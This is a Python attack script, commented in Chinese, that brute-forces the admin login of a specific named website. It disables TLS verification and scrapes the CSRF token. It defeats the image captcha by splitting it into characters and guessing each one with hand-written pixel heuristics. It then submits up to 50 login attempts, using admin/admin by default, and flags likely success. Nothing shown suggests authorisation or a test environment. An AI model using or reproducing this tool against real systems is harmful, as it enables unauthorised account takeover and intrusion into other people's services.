#!/usr/bin/env python3
"""momopro 验证码模板匹配+登录爆破"""
import urllib.request, http.cookiejar, ssl, io, re, sys, time
from PIL import Image

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

BASE = "https://momopro.digiflowtech.com"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent", "Mozilla/5.0")]

def get_login_page():
    r = op.open(f"{BASE}/web/index.php?r=admin%2Fpassport%2Flogin", timeout=8)
    html = r.read().decode("utf-8","ignore")
    m = re.search(r'_csrf = "([^"]+)"', html)
    return m.group(1) if m else None

def get_captcha():
    r = op.open(f"{BASE}/web/index.php?r=admin%2Fpassport%2Fcaptcha", timeout=8)
    return r.read()

def get_char_art(data):
    img = Image.open(io.BytesIO(data)).convert("RGB")
    w,h = img.size
    pix = list(img.getdata())
    def is_char(p):
        r,g,b = p
        return r < 80 and g < 120 and b > 120
    cols = [sum(1 for y in range(h) if is_char(pix[y*w+x])) for x in range(w)]
    segs = []
    in_seg = False
    for i,c in enumerate(cols):
        if c > 0 and not in_seg: start=i; in_seg=True
        elif c == 0 and in_seg: segs.append((start,i-1)); in_seg=False
    if in_seg: segs.append((start,w-1))
    if len(segs) != 4: return None
    arts = []
    for (s,e) in segs:
        rows = []
        for y in range(h):
            row = "".join("#" if is_char(pix[y*w+x]) else "." for x in range(s,e+1))
            rows.append(row)
        # 裁剪空行
        while rows and "#" not in rows[0]: rows.pop(0)
        while rows and "#" not in rows[-1]: rows.pop()
        arts.append(rows)
    return arts

# 字母特征: (width, 结构描述) - 简化匹配
def classify_char(rows):
    """根据ASCII特征识别字母"""
    if not rows: return None
    H = len(rows)
    W = max(len(r) for r in rows)
    # 统一宽度
    norm = []
    for r in rows:
        row = r + "." * (W - len(r))
        norm.append(row)
    # 特征提取
    top = norm[0]
    bottom = norm[-1]
    has_top_bar = "#" in top[:max(1,W//3)] and "#" in top[-max(1,W//3):]
    has_bottom_bar = "#" in bottom[:max(1,W//3)] and "#" in bottom[-max(1,W//3):]
    left_col = sum(1 for r in norm if r[0] == "#") / H
    right_col = sum(1 for r in norm if r[-1] == "#") / H
    # 交叉检测(X)
    diag = sum(1 for i,r in enumerate(norm) if i < len(norm) and (r[0]=="#" or r[-1]=="#"))
    # 中间行
    mid = norm[H//2]
    mid_left = "#" in mid[:W//2]
    mid_right = "#" in mid[W//2:]
    
    # 判定
    if left_col > 0.8 and right_col > 0.8 and has_top_bar and has_bottom_bar: return "O"
    if left_col > 0.8 and right_col > 0.8 and not has_top_bar and not has_bottom_bar: return "H"
    if left_col > 0.8 and right_col > 0.8 and has_top_bar and not has_bottom_bar: return "U"
    if left_col > 0.8 and right_col < 0.3 and has_top_bar and has_bottom_bar: return "E"
    if left_col > 0.8 and right_col < 0.3 and has_top_bar and not has_bottom_bar: return "F"
    if left_col > 0.8 and right_col < 0.2 and not has_top_bar and not has_bottom_bar: return "C"
    if left_col > 0.8 and not has_top_bar and not has_bottom_bar and mid_left and not mid_right: return "C"
    # P: 顶部圆+左竖线,底部左竖线
    if left_col > 0.8 and has_top_bar and not has_bottom_bar and mid_left and mid_right: return "P"
    if left_col > 0.8 and has_top_bar and has_bottom_bar and mid_left and not mid_right: return "D"
    if left_col > 0.8 and has_top_bar and has_bottom_bar and mid_left and mid_right: return "B"
    if left_col < 0.3 and right_col > 0.8 and has_bottom_bar: return "J"
    if left_col < 0.3 and right_col < 0.3 and not has_top_bar and not has_bottom_bar:
        # X或K或V或Y或A
        top_mid = norm[1] if len(norm)>1 else norm[0]
        if W > 8: return "X"
        return "V"
    if left_col < 0.3 and right_col < 0.3 and has_top_bar: return "T"
    if left_col < 0.3 and right_col < 0.3 and has_bottom_bar: return "Y"
    # K: 左竖线+右上斜
    if left_col > 0.6 and not has_top_bar and not has_bottom_bar:
        if mid_right: return "K"
        return "I"
    # A
    if left_col > 0.3 and right_col > 0.3 and not has_top_bar and not has_bottom_bar and mid_left and mid_right: return "A"
    if left_col > 0.4 and right_col > 0.4 and not has_top_bar and has_bottom_bar and mid_left and mid_right: return "N"
    # 数字
    if left_col > 0.8 and right_col > 0.8 and has_top_bar and not has_bottom_bar: return "O"  # 0
    if left_col < 0.2 and right_col < 0.2 and W < 6: return "1"
    if has_top_bar and not has_bottom_bar and right_col > 0.5 and left_col < 0.5: return "G"
    return "?"

def login(user, pwd, code, csrf):
    data = f"username={user}&password={pwd}&captcha_code={code}&_csrf={csrf}".encode()
    try:
        r = op.open(urllib.request.Request(f"{BASE}/web/index.php?r=admin%2Fpassport%2Flogin", data=data), timeout=8)
        body = r.read().decode("utf-8","ignore")
        return body
    except Exception as e:
        return f"ERR:{e}"

def main():
    user = sys.argv[1] if len(sys.argv) > 1 else "admin"
    pwd = sys.argv[2] if len(sys.argv) > 2 else "admin"
    for i in range(50):
        csrf = get_login_page()
        cap = get_captcha()
        arts = get_char_art(cap)
        if not arts:
            print(f"[{i}] seg fail", flush=True)
            continue
        code = "".join(classify_char(a) for a in arts)
        if "?" in code:
            print(f"[{i}] code={code} (低置信)", flush=True)
        else:
            body = login(user, pwd, code, csrf)
            if "验证码" in body or "captcha" in body.lower():
                print(f"[{i}] code={code} 验证码错", flush=True)
            elif "密码" in body or "用户" in body or "错误" in body:
                print(f"[{i}] code={code} 账号错: {body[:120]}", flush=True)
            else:
                print(f"[{i}] code={code} -> {body[:200]}", flush=True)
                if len(body) < 500 or "login" not in body.lower():
                    print(f"!!! 可能成功 {user}/{pwd}", flush=True)
                    break
        time.sleep(0.4)
    print("DONE")

if __name__ == "__main__":
    main()
